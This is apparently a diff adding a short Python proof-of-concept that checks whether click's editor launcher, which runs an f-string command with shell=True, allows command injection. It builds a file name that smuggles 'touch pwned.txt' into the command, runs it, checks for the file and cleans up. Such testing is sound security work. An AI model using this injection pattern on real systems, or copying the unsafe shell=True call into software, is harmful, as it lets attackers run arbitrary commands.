+import os
+import subprocess
+import click
+from click._termui_impl import Editor
+
+# The goal is to see if we can execute arbitrary commands.
+# The current implementation:
+# subprocess.Popen(f'{editor} "{filename}"', env=environ, shell=True)
+
+# If filename is: a" ; touch pwned.txt ; "
+# The command becomes:
+# cat "a" ; touch pwned.txt ; "" "
+
+# Let's verify this by running the command directly.
+editor = 'cat'
+filename = 'a" ; touch pwned.txt ; "'
+cmd = f'{editor} "{filename}"'
+print(f"Command: {cmd}")
+
+# Run it
+subprocess.run(cmd, shell=True)
+
+if os.path.exists('pwned.txt'):
+    print("Successfully pwned!")
+else:
+    print("Not pwned.")
+
+# Cleanup
+if os.path.exists('pwned.txt'):
+    os.remove('pwned.txt')
